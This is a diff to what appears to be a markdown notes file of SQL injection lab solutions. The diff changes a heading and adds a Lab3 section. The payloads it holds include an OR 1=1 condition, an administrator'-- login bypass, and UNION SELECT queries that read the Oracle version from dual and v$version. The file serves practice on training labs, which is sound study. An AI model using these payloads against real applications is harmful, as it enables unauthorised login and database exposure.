@@ -7,9 +7,16 @@
 '+OR+1=1--
 ```
 
-#### Lab2: SQL injection vulnerability allowing login bypass
+## Lab2: SQL injection vulnerability allowing login bypass
 >**Q. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. **
 
 ```sh
 administrator'--
+```
+## Lab3: SQL injection attack, querying the database type and version on Oracle
+```sh
+'+UNION+SELECT+'abc','def'+FROM+dual--
+```
+```sh
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 ```
